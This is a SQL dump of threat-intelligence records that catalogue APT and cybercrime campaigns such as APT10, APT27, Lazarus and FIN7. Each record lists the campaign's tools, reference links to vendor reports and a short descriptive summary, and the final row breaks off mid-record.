INSERT INTO `attack_campaign` VALUES (2,19,'A41APT','','https://otx.alienvault.com/pulse/601832343e90a9658287a666\n','','Period of Activity: March 2019 to January 2021 Present. Target: Japan (Japanese companies including overseas branches). Initial Vector: Not Spear phishing But SSL-VPN abuse. Malwares: New type of malwares using dll-sideloadin?SodaMaster/P8RAT/DESLoader/FYAntiLoader etc.) Holds posible relations to APT10 / BlackTech groups.\n','2021-04-18 00:00:00','2021-04-18 00:00:00',NULL),(3,1,'ChessMasters','','https://otx.alienvault.com/pulse/5a06e982aece4f705d614430\n','','A few months ago, we covered the ChessMaster cyberespionage campaign, which leveraged a variety of toolsets and malware such as ChChes and remote access trojans like RedLeaves and PlugX to compromise its targets—primarily organizations in Japan. A few weeks ago, we observed new activity from ChessMaster, with notable evolutions in terms of new tools and tactics that weren’t present in the initial attacks. From what we’ve seen, ChessMaster is continuously evolving, using open source tools and ones they developed, likely as a way to anonymize their operations. Based on the way the campaign has developed, it won’t be surprising to see additional evolutions from ChessMaster in the future.\n','2021-04-18 00:00:00','2021-04-18 00:00:00',NULL),(4,29,'Japan-Linked Organizations Targeted in Long-Running and Sophisticated Attack Campaign','PowerShell \nWMIExec\nNtdsutil \nCsvde\nAdfind\nCertutil\nRAR archiving','https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/cicada-apt10-japan-espionage','','This report provides a technical overview of the bespoke RedLeaves implants leveraged by the actor in their “new battle” campaign','2021-04-18 00:00:00','2021-06-03 07:02:17',NULL),(5,4,'LODEINFO Malware','','https://otx.alienvault.com/pulse/602e572f3af1a9faadae92a7','','Cases that we have observed are all originated in targeted emails with a malicious file attachment, either a Word or Excel file. It contains a macro which creates and executes LODEINFO on the host if enabled','2021-04-18 00:00:00','2021-04-18 00:00:00',NULL),(6,10,'LookBack Malware','','https://otx.alienvault.com/pulse/5d435220be18ed8c4fa2e9ee','','Between July 19 and July 25, 2019, several spear phishing emails were identified?targeting three US companies in the utilities sector. The phishing emails appeared to impersonate a US-based engineering licensing board with emails originating from what appears to be an actor-controlled domain?nceess[.]com.?Nceess[.]com is, believed to be an impersonation of a domain owned by the US National Council of Examiners for Engineering and Surveying. The emails contain a malicious Microsoft Word attachment that uses macros to install and run malware that Proofpoint researchers have dubbed “LookBack.” This malware consists of a remote access Trojan (RAT) module and a proxy mechanism used for command and control (C&C) communication.? We believe this may be the work of a state-sponsored APT actor based on overlaps with historic campaigns and macros utilized','2021-04-18 00:00:00','2021-04-18 00:00:00',NULL),(7,22,'MenuPass QuasarRAT Backdoor','','https://otx.alienvault.com/pulse/5d0a020be4ce6995025edfbe','','During the latter half of 2018, BlackBerry Cylance threat researchers tracked a campaign targeting companies from several verticals across the EMEA region. The campaign seemed to be related to the MenuPass (a.k.a. APT10/Stone Panda/Red Apollo) threat actor, and utilized an open-source backdoor named QuasarRAT to achieve persistence within an organization. We identified several distinct loader variants tailored to specific targets by leveraging machine learning (ML) to analyse our malware corpus. We have not observed new QuasarRAT samples in the wild since late 2018, roughly coinciding with when the FBI indicted several members of the MenuPass group','2021-04-18 00:00:00','2021-04-18 00:00:00',NULL),(8,33,'Operation “Cloud Hopper”','','https://www.pwc.co.uk/cyber-security/pdf/cloud-hopper-report-final-v4.pdf','','The campaign, which we refer to as Operation Cloud Hopper, has targeted managed IT service providers (MSPs), allowing APT10 unprecedented potential access to the intellectual property and sensitive data of those MSPs and their clients globally. A number of Japanese organizations have also been directly targeted in a separate, simultaneous campaign by the same actor.','2021-04-18 00:00:00','2021-04-18 00:00:00',NULL),(9,24,'Operation “New Battle”','','https://www.accenture.com/t20180423T055005Z_w_/se-en/_acnmedia/PDF-76/Accenture-Hogfish-Threat-Analysis.pdf','','This report provides a technical overview of the bespoke RedLeaves implants leveraged by the actor in their “new battle” campaign','2021-04-18 00:00:00','2021-04-18 00:00:00',NULL),(10,9,'Red Leaves Implant','','https://github.com/nccgroup/Cyber-Defence/blob/master/Technical%20Notes/Red%20Leaves/Source/Red%20Leaves%20technical%20note%20v1.0.md\nhttps://otx.alienvault.com/pulse/58eba6db5f843938240a4d13','','This technical note discusses a relatively undocumented implant used by the APT10 group. This is named “Red Leaves” after strings found in the malware. The sample discussed was found during an incident response engagement in March 2017. The earliest evidence obtained shows it has been in use since at least November 2016.','2021-04-18 00:00:00','2021-04-18 00:00:00',NULL),(11,84,'Spear Phishing Attack','','https://unit42.paloaltonetworks.com/unit42-menupass-returns-new-malware-new-attacks-japanese-academics-organizations/','','The attackers spoofed several sender email addresses to send spear-phishing emails, most notably public addresses associated with the Sasakawa Peace Foundation and The White House.\nTarget: Japanese academics working in several areas of science, along with Japanese pharmaceutical and a US-based subsidiary of a Japanese manufacturing organizations.','2021-04-18 00:00:00','2021-04-18 00:00:00',NULL),(12,2,'Sustained Cyber Espionage Campaign','','https://go.recordedfuture.com/hubfs/reports/cta-2019-0206.pdf','','A sustained cyberespionage campaign targeting at least three\ncompanies in the United States and Europe was uncovered\nby Recorded Future and Rapid7 between November 2017 and\nSeptember 2018. Based on the technical data uncovered, and in\nlight of recent disclosures by the U.S. Department of Justice on\nthe ongoing activities of Chinese state-sponsored threat actors, we\nassess with high confidence that these incidents were conducted by\nAPT10 (also known as Stone Panda, menuPass, CVNX) in an effort\nto gain access to networks and steal valuable intellectual property\nor gain commercial advantage','2021-04-18 00:00:00','2021-04-18 00:00:00',NULL),(13,1558,'Verk','','https://otx.alienvault.com/pulse/5cb95413b8320c1bf67ea8a0','','','2021-04-18 00:00:00','2021-04-18 00:00:00',NULL),(14,43,'Keeping up with OceanLotus Decoys',NULL,NULL,NULL,NULL,NULL,NULL,NULL),(15,6,'New Backdoor Linked to Oceanlotus',NULL,NULL,NULL,NULL,NULL,NULL,NULL),(16,26,'OceanLotus Blossoms',NULL,NULL,NULL,NULL,NULL,NULL,NULL),(17,82,'OceanLotus’ KerrDown',NULL,NULL,NULL,NULL,NULL,NULL,NULL),(18,102,'PhantomLance',NULL,NULL,NULL,NULL,NULL,NULL,NULL),(19,8,'Ratsnif',NULL,NULL,NULL,NULL,NULL,NULL,NULL),(21,11,'Phishing Campaign',NULL,NULL,NULL,NULL,NULL,NULL,NULL),(22,45,'Fox Kitten Campaign',NULL,NULL,NULL,NULL,NULL,NULL,NULL),(23,6,'Karkoff 2020',NULL,NULL,NULL,NULL,NULL,NULL,NULL),(24,6,'New Iranian Campaign',NULL,NULL,NULL,NULL,NULL,NULL,NULL),(25,6,'OilRig targets LANDesk',NULL,NULL,NULL,NULL,NULL,NULL,NULL),(27,9,'OilRig Targets QUADAGENT',NULL,NULL,NULL,NULL,NULL,NULL,NULL),(28,2,'OilRig Targets the Middle East using RGDoor IIS Backdoor',NULL,NULL,NULL,NULL,NULL,NULL,NULL),(29,8,'Shamoon',NULL,NULL,NULL,NULL,NULL,NULL,NULL),(30,23,'An accidental APT attack and averted data destruction',' NBTScan \nPsExec \nMimikatz\nEternalBlue exploit\nSysUpdate\nHyperBro\n','https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/incident-response-polar-ransomware-apt27/','','In late April 2020, a client invited the CSIRT incident response team at the Positive Technologies Expert Security Center (PT ESC) to investigate a network compromise that resulted in encryption of files on servers and employee workstations.\nWe initially assumed that this was yet another attack on corporate networks with a common variety of ransomware.  However, what we found was different: this intrusion was the work of a well-known Asian APT group implicated in cyberespionage against government targets. The initial successful compromise had taken place two years prior.','2021-04-18 00:00:00','2021-04-18 00:00:00',NULL),(31,7,'APT27 Abusing COVID-19 To Attack People','PlugX','https://marcoramilli.com/2020/03/19/is-apt27-abusing-covid-19-to-attack-people/','','We are living hard time, many countries all around the world are hit by COVID-19 which happened to be a very dangerous disease. Unfortunately many deaths, thousands of infected people, few breathing equipment, stock burned Billion of dollars and a lot of companies are entering into a economic and financial crisis. Governments are doing their best to mitigate such a virus while people are stuck home working remotely using their own equipment.\nIn that scenario, jackals are luring people using every dirty way to attack their private devices. At home it’s hard to have advanced protection systems as we have in companies. For example it’s hard to have Intrusion Prevention Systems, proxies, advanced threat protection, automated sandbox and again advanced end-point protections letting personal devices more vulnerable to be attacked. In this reality ruthless attackers abuse of this situation to attack digitally unprotected people.','2021-04-18 00:00:00','2021-04-18 00:00:00',NULL),(32,30,'APT27 Attack on Media Organization','NetSupport\nServHelper\nSysUpdate\nHyperBro\nPolar\n','https://otx.alienvault.com/pulse/6055cf97b3ad64d88f76509d','','','2021-04-18 00:00:00','2021-04-18 00:00:00',NULL),(33,7,'APT27 Turns to Ransomware','ASPXSpy webshell\nPlugX and Clambling\nMimikatz\nCryptoMiner\n\nExploiting CVE-2017-0213','https://shared-public-reports.s3-eu-west-1.amazonaws.com/APT27+turns+to+ransomware.pdf','','A team was able to discover samples of malware linked to a\ncampaign reported on by TrendMicro1, known as DRBControl, with links to both APT groups: APT27 and Winnti. This particular campaign revolves around attacks on major gaming companies, worldwide.DRBControl was first reported on by TrendMicro and Talent-Jump Technologies at the beginning of 2020 and covered an incident they responded to back in 2019. What was interesting about this backdoor was its utilization of Dropbox as a Command and Control (C2) server. Our team discovered a very similar sample that we were able to identify as a variant of Clambling, however the sample lacked any Dropbox capabilities. As a result, it could be considered an older variant; or that the threat actors have different variants for different use cases.\n','2021-04-18 00:00:00','2021-04-18 00:00:00',NULL),(34,195,'Emissary Panda','cURL\nMimikatz\nEternalBlue\nHyperBro\n','https://unit42.paloaltonetworks.com/emissary-panda-attacks-middle-east-government-sharepoint-servers/','The adversary exploited a recently patched vulnerability in Microsoft SharePoint tracked by CVE-2019-0604.\n','This webshell activity took place across three SharePoint servers hosted by two different government organizations between April 1, 2019 and April 16, 2019, where actors uploaded a total of 24 unique executables across the three SharePoint servers.','2021-04-18 00:00:00','2021-04-18 00:00:00',NULL),(35,210,'LuckyMouse Waterholing Campaign','HyperBro Trojan\nMetasploit’s shikata_ga_nai encoder\nLZNT1 compression\n','https://securelist.com/luckymouse-hits-national-data-center/86083/','The TTPs for this campaign are quite common for Chinese-speaking actors, where they typically provide new solid wrappers (launcher and decompressor protected with shikata_ga_nai in this case) around their RATs (HyperBro)','In March 2018 we detected an ongoing campaign targeting a national data center in the Central Asia that we believe has been active since autumn 2017. The choice of target made this campaign especially significant – it meant the attackers gained access to a wide range of government resources at one fell swoop. We believe this access was abused, for example, by inserting malicious scripts in the country’s official websites in order to conduct watering hole attacks.','2021-04-18 00:00:00','2021-04-18 00:00:00',NULL),(36,27,'Operation PZCHAO','','https://labs.bitdefender.com/2018/02/operation-pzchao-a-possible-return-of-the-iron-tiger-apt/\nhttps://labs.bitdefender.com/wp-content/uploads/downloads/operation-pzchao-inside-a-highly-specialized-espionage-infrastructure/','Download\nUpload\nRAT related actions\nMalware DLL delivery\n','The case of a custom-built piece of malware that we have been monitoring for several months as it wrought havoc in Asia. Threat intelligence systems picked up the first indicators of compromise in July last year, and we have kept an eye on the threat ever since.\nAn interesting feature of this threat, which drew to the challenge of analyzing it, is that it features a network of malicious subdomains, each one used for a specific task (download, upload, RAT related actions, malware DLL delivery). The payloads are diversified and include capabilities to download and execute additional binary fi les, collect private information and remotely execute commands on the system.\n','2021-04-18 00:00:00','2021-04-18 00:00:00',NULL),(37,12,'ZxShell RootKit','NetSupport\nServHelper\nSysUpdate\nHyperBro\nPolar','https://otx.alienvault.com/pulse/6055cf97b3ad64d88f76509d','','','2021-04-18 00:00:00','2021-04-18 00:00:00',NULL),(38,87,'APT37 + Konni APT','Spear phishing\nStrategic compromising of web sites, possibly for espionage purposes\nTorrent file-sharing for malware delivery\n','https://otx.alienvault.com/pulse/5f4360a54852bba1c8ecba32\nhttps://otx.alienvault.com/pulse/5c6451eb3c60ef4ea6ef942e\nhttps://exchange.xforce.ibmcloud.com/collection/Fear-The-Reaper-North-Korean-Group-APT37-dc96e8bdff7573efb87d43d7584c1fbc\nhttps://exchange.xforce.ibmcloud.com/collection/Operation-Earth-Kitsune-Analysis-a2ce41d8d3c7cfea5c2aba64f50f747f/reports','\n','','2021-04-18 00:00:00','2021-04-18 00:00:00',NULL),(39,116,'DOKKAEBI','','https://otx.alienvault.com/pulse/5b611c3844845a01999b52a0','','Dokkaebi is frequently disguised as a legitimate organization or company in order to lure its targets. Once the HWP malware is executed, it acts in an insidious way. HWP malware is very well known and is mentioned in many threat intelligence reports. This kind of malware has long been used in spear-phishing attacks due to the fact that the South Korean government and many public organizations have, for many years, used Hangul Word Processor (a.k.a HWP) as their official documentation software. The interesting part regarding HWP malware is that the payload dropped from this malware is related to well-known malware families and threat groups such as Scarcruft (Group123, Reaper), Bluenoroff, Kimsuky and so on. These malicious payloads have also been observed in several incidents targeting cryptocurrency exchanges located in many other countries as well as in South Korea.','2021-04-18 00:00:00','2021-04-18 00:00:00',NULL),(40,25,'Group123 (APT37)','','https://otx.alienvault.com/pulse/5db704aa250f80523798e6bc','','The adversary group known as Group123, APT37, and ScarCruft has been observed','2021-04-18 00:00:00','2021-04-18 00:00:00',NULL),(41,46,'HIDDEN COBRA','','https://otx.alienvault.com/pulse/5dbb46d7f09cc90bbe9612e3','','HIDDEN COBRA actors have leveraged their capabilities to target and compromise a range of victims; some intrusions have resulted in the exfiltration of data while others have been disruptive in nature','2021-04-18 00:00:00','2021-04-18 00:00:00',NULL),(42,94,'Operation Blackbird','','https://otx.alienvault.com/pulse/5c1227049dddaf33f249510a','','The interesting part regarding HWP malware is that the payload dropped from this malware is related to well-known malware families and threat groups such as Scarcruft (Group123, Reaper), Bluenoroff, Kimsuky and so on. These malicious payloads have also been observed in several incidents targeting cryptocurrency exchanges located in many other countries as well as in South Korea. This talk will cover a wide range of HWP malware. We attempt to organize and re-categorize these malware families with our own perspective by using vulnerabilities, decoding algorithms, methods of distribution, unique TTPs, etc.','2021-04-18 00:00:00','2021-04-18 00:00:00',NULL),(43,90,'Reaper','','https://otx.alienvault.com/pulse/5e9859999aa2028358d22dba\nhttps://otx.alienvault.com/pulse/5ac7a9272a02e86fe2cb5672\nhttps://otx.alienvault.com/pulse/5a9042bcc11fe923d5dee65a','','A blog was published detailing the use of an Adobe Flash zero-day vulnerability (CVE-2018-4878) by a suspected North Korean cyber espionage group that we now track as APT37 (Reaper). Recent examination of this group’s activities by FireEye iSIGHT Intelligence reveals APT37 has expanded its operations in both scope and sophistication. APT37’s toolset, which includes access to zero-day vulnerabilities and wiper malware, combined with heightened tensions in Northeast Asia and North Korea’s penchant for norm breaking, means this group should be taken seriously.','2021-04-18 00:00:00','2021-04-18 00:00:00',NULL),(44,21,'Red Eyes',NULL,'https://otx.alienvault.com/pulse/5b7292437b5f602d8ad8d438',NULL,'Red Eyes attack group has also been tracked as Geumseong121, Group 123, ScarCruft, APT37, Reaper, and Ricochet Chollima. Based on the contents of malicious files used in the attacks, it appears that its main targets are organizations and individuals whose work involves North Korea. These include North Korean defectors, human rights activists for North Korea, North Korean researchers, and journalists. In some cases, it has even accessed South Korean military related documents.','2021-04-18 00:00:00','2021-04-18 00:00:00',NULL),(45,19,'RokRat','','https://blog.malwarebytes.com/threat-analysis/2021/01/retrohunting-apt37-north-korean-apt-used-vba-self-decode-technique-to-inject-rokrat/\nhttps://otx.alienvault.com/pulse/5ff6b84817217764a05dd8a1/\nhttps://exchange.xforce.ibmcloud.com/collection/APT37-Using-Self-Decoding-to-Inject-RokRat-fe715d42b511f480bf901f344e93bd2b/reports','A North Korean cyber-attack group has used a self-decoding technique to inject a variant of RokRat into Notepad','ROKRAT is a cloud-based remote access tool (RAT) used by APT37. This software has been used to target victims in South Korea. APT37 used ROKRAT during several campaigns in 2016 through onwards.','2021-04-18 00:00:00','2021-04-18 00:00:00',NULL),(46,158,'Thallium','','https://otx.alienvault.com/pulse/5e0b9895c5ed003a85210202\nhttps://otx.alienvault.com/pulse/5e0f11cb609048bca6bd18de\nhttps://otx.alienvault.com/pulse/5e0bcde30e1e27c927b7435b','','The domains were used to send phishing emails and host phishing pages. Thallium hackers would lure victims on these sites, steal their credentials, and then gain access to internal networks, from where they\'d escalate their attacks even further.','2021-04-18 00:00:00','2021-04-18 00:00:00',NULL),(47,83,'FIN7 JSSLOADER RAT','JSSLoader','https://otx.alienvault.com/pulse/6034c2538e10ebc5958d8f1c','','This report presents an attack chain that was intercepted and prevented within a customer’s network in December 2020, then will focus on a component from a typical FIN7 attack chain – JSSLoader. Though JSSLoader is well known as a minimized .NET RAT, not many details have been publicly available with respect to various capabilities such as exfiltration, persistence, auto-update, malware downloading, and more. Furthermore, in the many occasions where JSSLoader is mentioned, there are few details on the complete attack chain. The following provides a never-before-seen technical analysis of this infamous group’s JSSLoader as part of an end-to-end attack.','2021-04-18 00:00:00','2021-04-18 00:00:00',NULL),(48,2,' Bateleur JScript Backdoor','','https://www.proofpoint.com/us/threat-insight/post/fin7carbanak-threat-actor-unleashes-bateleur-jscript-backdoor','','Proofpoint researchers have uncovered that the threat actor commonly referred to as FIN7 has added a new JScript backdoor called Bateleur and updated macros to its toolkit. We have observed these new tools being used to target U.S.-based chain restaurants, although FIN7 has previously targeted hospitality organizations, retailers, merchant services, suppliers and others. The new macros and Bateleur backdoor use sophisticated anti-analysis and sandbox evasion techniques as they attempt to cloak their activities and expand their victim pool.','2021-04-18 00:00:00','2021-04-18 00:00:00',NULL),(49,4,'BIOLOAD: FIN7 BOOSTWRITE\'s Lost Twin','BIOLOAD\nThe Carbanak Backdoor\n','https://www.fortinet.com/blog/threat-research/bioload-fin7-boostwrite-lost-twin','','enSilo’s endpoint protection platform blocked malicious payloads running in legitimate Microsoft Windows processes. A deeper look uncovered that the attacker abused the DLL search order to load their own malicious DLL. Some of the samples in the environment matched ones described in a recent publication by FireEye about FIN7’s new tools and techniques, specifically BOOSTWRITE. Comparing the rest of the samples to BOOSTWRITE revealed they have a common codebase and carry the Carbanak backdoor.','2021-04-18 00:00:00','2021-04-18 00:00:00',NULL),(50,41,'Collaboration between FIN7 and the RYUK group','CARBANAK RAT\nPowerShell RAT\nCobalt Strike\nSmartFTP Client\n','https://blog.truesec.com/2020/12/22/collaboration-between-fin7-and-the-ryuk-group-a-truesec-investigation/','','This attack marks the first instance Truesec has observed of the combination of FIN7 tools and the RYUK ransomware, indicating a change in pattern for FIN7 attacks. Up until now FIN7 has not been associated with ransomware attacks. This also suggests a closer collaboration between FIN7 and the RYUK group, also known as WIZARD SPIDER or FIN6, than has been previously known by Truesec.','2021-04-18 00:00:00','2021-04-18 00:00:00',NULL),(51,1,'Spear Phishing Campaign Targets Personnel Involved in SEC Filings','','https://www.fireeye.com/blog/threat-research/2017/03/fin7_spear_phishing.html','','In late February 2017, FireEye as a Service (FaaS) identified a spear phishing campaign that appeared to be targeting personnel involved with United States Securities and Exchange Commission (SEC) filings at various organizations. Based on multiple identified overlaps in infrastructure and the use of similar tools, tactics, and procedures (TTPs), we have high confidence that this campaign is associated with the financially motivated threat group tracked by FireEye as FIN7.','2021-04-18 00:00:00','2021-04-18 00:00:00',NULL),(52,57,'FIN7.5','GRIFFON\nMeterpreter downloader\n','https://securelist.com/fin7-5-the-infamous-cybercrime-rig-fin7-continues-its-activities/90703/','','The FIN7 intrusion set continued its tailored spear phishing campaigns throughout last year. Kaspersky Lab has been able to retrieve some of these exchanges from a FIN7 target. The spear phishing campaigns were remarkably sophisticated from a social engineering perspective. In various cases, the operators exchanged numerous messages with their victims for weeks before sending their malicious documents. The emails were efficient social-engineering attempts that appealed to a vast number of human emotions (fear, stress, anger, etc.) to elicit a response from their victims. One of the domains used by the attackers in their 2018 campaign of spear phishing contained more than 130 email aliases, leading us to think that more than 130 companies had been targeted by the end of 2018.','2021-04-18 00:00:00','2021-04-18 00:00:00',NULL),(53,203,'Lazarus and Cryptocurrency',NULL,NULL,NULL,NULL,NULL,NULL,NULL),(54,104,'Lazarus Targets Defense Industry with ThreatNeedle',NULL,NULL,NULL,NULL,NULL,NULL,NULL),(55,27,'Lazarus Supply Chain Attack',NULL,NULL,NULL,NULL,NULL,NULL,NULL),(56,58,'Operation Dream Job',NULL,NULL,NULL,NULL,NULL,NULL,NULL),(57,149,'Muddying the Water','','https://unit42.paloaltonetworks.com/unit42-muddying-the-water-targeted-attacks-in-the-middle-east/','','','2021-04-18 00:00:00','2021-04-18 00:00:00',NULL),(58,30,'Operation Quicksand','','https://www.clearskysec.com/wp-content/uploads/2020/10/Operation-Quicksand.pdf','','','2021-04-18 00:00:00','2021-04-18 00:00:00',NULL),(59,106,'Spear phishing Docs used by MuddyWater','','https://securelist.com/muddywater/88059/','','','2021-04-18 00:00:00','2021-04-18 00:00:00',NULL),(60,112,'MOLERATS IN THE CLOUD','','https://www.cybereason.com/hubfs/dam/collateral/reports/Molerats-in-the-Cloud-New-Malware-Arsenal-Abuses-Cloud-Platforms-in-Middle-East-Espionage-Campaign.pdf\nhttps://www.cybereason.com/blog/molerats-apt-new-malware-and-techniques-in-middle-east-espionage-campaign','','Cybereason published a report that revealed that they had uncovered a new attack campaign launched by Molerats. This operation cohered with previous attacks launched by the APT in that it used political events in the Middle East as lures. In particular, the campaign focused on the ongoing normalization process between Israel and its Arab neighbors. One of the phishing documents, a PDF file titled “MBS-Israel,” explored that development by referencing the peace talks between Israeli Prime Minister Benjamin Netanyahu and His Royal Highness Mohammed bin Salman, Saudi Crown Prince.','2021-04-18 00:00:00','2021-04-18 00:00:00',NULL),(61,65,'Operation SneakyPastes','invoke PowerShell\nVBS \n.NET app downloader\nPhishing Email\nRAT','https://securelist.com/gaza-cybergang-group1-operation-sneakypastes/90068/','In this campaign, Gaza Cybergang used disposable emails and domains as the phishing platform to target the victims','Operation “SneakyPastes” The campaign is multistage. It begins with phishing, using letters from one-time addresses and one-time domains. Sometimes the letters contain links to malware or infected attachments. If the victim executes the attached file (or follows the link), their device receives Stage One malware programmed to activate the infection chain.','2021-04-18 00:00:00','2021-04-18 00:00:00',NULL),(62,117,'Molerats Delivers Spark Backdoor','','https://unit42.paloaltonetworks.com/molerats-delivers-spark-backdoor/\nhttps://www.bleepingcomputer.com/news/security/hackers-hide-malware-c2-communication-by-faking-news-site-traffic/','A cyber-espionage group active since at least 2012 used a legitimate tool to shield their backdoor from analysis attempts to avoid detection','Between October 2019 through the beginning of December 2019, Unit 42 observed multiple instances of phishing attacks likely related to a threat group known as Molerats (AKA Gaza Hackers Team and Gaza Cybergang) targeting eight organizations in six different countries in the government, telecommunications, insurance and retail industries, of which the latter two were quite peculiar. The targeting of insurance and retail organizations is peculiar as it does not fit with this threat groups prior target set. The email subject and attachment file names used in the attacks on these seemingly atypical targets were similar in theme as those used when attacking government organizations. The lack of industry or target specific social engineering themes likely lowers the chances of a successful compromise and further confuses our understanding of the purpose of attacking these organizations.','2021-04-18 00:00:00','2021-04-18 00:00:00',NULL),(64,46,'The Pierogi Campaign','','https://www.cybereason.com/blog/new-cyber-espionage-campaigns-targeting-palestinians-part-one','This campaign uses social engineering attacks to infect victims with a new, undocumented backdoor dubbed Pierogi','“Pierogi” Campaign This campaign uses social engineering attacks to infect victims with a new, undocumented backdoor dubbed Pierogi. This backdoor first emerged in December 2019, and was discovered by Cybereason. In this campaign, the attackers use different TTPs and decoy documents reminiscent of previous campaigns by MoleRATs involving the Micropsia and Kaperagent malware.','2021-04-18 00:00:00','2021-04-18 00:00:00',NULL),(66,59,'Test profile','','','','','2021-04-19 05:56:10','2021-04-19 05:57:20',NULL),(94,262,'Operation Cleaver',NULL,'http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf',NULL,'','2017-08-24 04:26:22','2017-08-24 09:26:22','547e0a9511d4080d5a98d83f'),(95,0,'','CVE-2017-0199,  ThreadKit builder, CMSTP, Regsvr32','https://unit42.paloaltonetworks.com/unit42-new-techniques-uncover-attribute-cobalt-gang-commodity-builders-infrastructure-revealed/','','Nowadays, it’s very easy for an advanced attacker to use commodity tools and malware along with very simple initial delivery methods to keep a low profile and stay away from possible attribution. One of the most common approaches is the use of spear phishing emails employing social engineering or commonly used exploits (such as CVE-2017-0199 or the ThreadKit builder) to trick the employees of organizations of interest. Once the initial infection has occurred is when the attacker becomes more sophisticated, deploying advanced custom pieces of malware, more advanced tools, and/or using living-off-the land tools (such as the use of PowerShell, or tools like CMSTP or Regsvr32).','2021-05-03 17:02:30','2021-05-03 17:02:30',NULL),(96,10,'FIN4: Stealing Insider Information for an Advantage in Stock Trading?','','https://otx.alienvault.com/pulse/58cf29de7c7d0b0401197f8e \nhttps://otx.alienvault.com/pulse/558b00acb45ff51f4b25e6fb\nhttps://www.fireeye.com/blog/threat-research/2014/11/fin4_stealing_insid.html','','FireEye is currently tracking a group that targets the email accounts of individuals privy to the most confidential information of more than 100 companies. The group, which we call FIN4, appears to have a deep familiarity with business deals and corporate communications, and their effects on financial markets','2021-05-03 17:07:19','2021-05-30 16:28:58',NULL),(97,75,'Deciphering Confucius Cyberespionage Operations',NULL,'https://blog.trendmicro.com/trendlabs-security-intelligence/deciphering-confucius-cyberespionage-operations/',NULL,'In today’s online chat and dating scene, romance scams are not uncommon, what with catfishers and West African cybercriminals potently toying with their victims’ emotions to cash in on their bank accounts. It’s quite odd (and probably underreported), however, to see it used as a vector for cyberespionage.','2018-02-13 09:09:20','2018-02-13 14:09:20','5a82f190b29f32235c5ab7f9'),(100,62,'Analysis Of Targeted Attack Against Pakistan By Exploiting InPage Vulnerability And Related APT Groups',NULL,'https://ti.360.net/blog/articles/analysis-of-targeted-attack-against-pakistan-by-exploiting-inpage-vulnerability-and-related-apt-groups-english/',NULL,'Recently, 360 Threat Intelligence Center found a series of targeted attacks against Pakistan targets. Attacker exploited one vulnerability (CVE-2017-12824) of InPage to craft bait documents (.inp). InPage is a word processing software designed specifically for Urdu speakers (official language in Pakistan). In addition, Office documents with CVE-2018-0798 vulnerability were also used in the attack. Kaspersky disclosed one target attack in which InPage vulnerability was exploited in November 2016 . However, first attack by using such software vulnerability can be traced back to June 2016.','2018-11-30 11:21:10','2018-11-30 16:21:10','5c002c2a3e22bc6c57835dc7'),(101,19,'New Patchwork Malware',NULL,'https://twitter.com/shotgunner101/status/1084112825608536069',NULL,'Continuing attacks from the group known as Patchwork.','2019-01-14 07:33:28','2019-01-14 12:33:28','5c3c8199888d403ecee5e463'),(102,81,'BITTER APT: Not So Sweet','Trojan:Win32/Bitter','https://meltx0r.github.io/tech/2019/09/09/bitter-apt-not-so-sweet-pt2.html',NULL,'This post is a continuation of my tracking efforts of the APT group known as “BITTER”, in which I review additional undiscovered infrastructure and their Remote Access Trojan (RAT) known as BitterRAT.','2019-09-10 05:42:41','2019-09-10 10:42:41','5d777e210d50ae9e825ff716'),(105,93,'Lucky Elephant Campaign Masquerading','','https://otx.alienvault.com/pulse/5c9a652a4f81ac754fce3acd\n','','n early March 2019, ASERT Researchers uncovered a credential harvesting campaign targeting mostly South Asian governments. The actors behind this campaign we call LUCKY ELEPHANT use doppelganger webpages to mimic legitimate entities such as foreign governments, telecommunications, and military. Interestingly, at least one IP address used in the campaign was previously associated with a suspected Indian APT group, and one domain was previously attributed to Chinese APT activity. It is unclear the purpose of the overlap in the infrastructure, but it’s possible the actors used it as a diversionary tactic.\n','2021-05-03 17:28:33','2021-08-02 16:18:33',NULL),(341,9,'First Activities of Cobalt Group in 2018: Spear Phishing Russian Banks','CVE-2017-11882\n','https://unit42.paloaltonetworks.com/unit42-new-techniques-uncover-attribute-cobalt-gang-commodity-builders-infrastructure-revealed/\n','','ast year November, we documented activities of the Cobalt Group using CVE-2017-11882. In December they were already setting up for their next campaign. Today, on January 16th, the first wave of spear phishing emails were delivered to the inboxes of Russian banks. Sadly, this time around, the group didn’t forget to BCC\n','2021-05-30 16:24:48','2021-07-07 11:14:25',NULL),(577,22,'Operation Blockbuster Goes Mobile',NULL,NULL,NULL,NULL,NULL,NULL,NULL),(578,12,'North Korean Cyber-Attacks and Collateral Damage',NULL,NULL,NULL,NULL,NULL,NULL,NULL),(579,16,'Attacks against South Korean Ministry of Unification',NULL,NULL,NULL,NULL,NULL,NULL,NULL),(580,150,'Disclosure of Chilean Redbanc Intrusion Leads to Lazarus Ties',NULL,NULL,NULL,NULL,NULL,NULL,NULL),(581,5,'Lazarus malicious Cryptocurrency Trading Applications',NULL,NULL,NULL,NULL,NULL,NULL,NULL),(582,26,'North Korean Tunneling Tool: ELECTRICFISH',NULL,NULL,NULL,NULL,NULL,NULL,NULL),(583,4,'Targeted TrickBot activity drops \'PowerBrace\' backdoor',NULL,NULL,NULL,NULL,NULL,NULL,NULL),(584,27,'Lazarus APT Organization Attacks with Telegram Messenger',NULL,NULL,NULL,NULL,NULL,NULL,NULL),(585,10,'New macOS Threat Served from Cryptocurrency Trading Platform',NULL,NULL,NULL,NULL,NULL,NULL,NULL),(586,106,'North Korean Malicious Cyber Activity - CISA Alert',NULL,NULL,NULL,NULL,NULL,NULL,NULL),(587,216,'Hidden Cobra - Enriched public threat intelligence',NULL,NULL,NULL,NULL,NULL,NULL,NULL),(588,115,'MATA: Multi-platform targeted malware framework',NULL,NULL,NULL,NULL,NULL,NULL,NULL),(589,15,'Lazarus on the hunt for big game - VHD Ransomware',NULL,NULL,NULL,NULL,NULL,NULL,NULL),(590,325,'Recent CRAT Remote Access Trojan Activity',NULL,NULL,NULL,NULL,NULL,NULL,NULL),(591,17,'Lazarus recent Manuscrypt campaign',NULL,NULL,NULL,NULL,NULL,NULL,NULL),(592,104,'Anatomy of a Lazarus cyber espionage campaign',NULL,NULL,NULL,NULL,NULL,NULL,NULL),(593,15,'Lazarus Targeting COVID-19 Related Research',NULL,NULL,NULL,NULL,NULL,NULL,NULL),(594,57,'Operation Dream Job / Interception by Lazarus',NULL,NULL,NULL,NULL,NULL,NULL,NULL),(595,32,'Lazarus Attack Activities Targeting Japan with VSingle and ValeforBeta 